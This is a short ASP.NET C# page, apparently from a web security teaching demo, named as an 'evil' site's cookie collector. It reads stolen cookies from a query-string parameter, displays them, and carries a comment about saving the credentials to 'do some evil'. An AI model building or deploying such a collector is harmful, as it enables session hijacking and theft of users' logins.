using System;
using System.Web.UI;

namespace EvilShopliftingSite
{
  public partial class GetCookies : Page
  {
    protected void Page_Load(object sender, EventArgs e)
    {
      CookiesLabel.Text = Request.QueryString["Cookies"];

      // Save the credentials somewhere so I can come back and do some evil.
    }
  }
}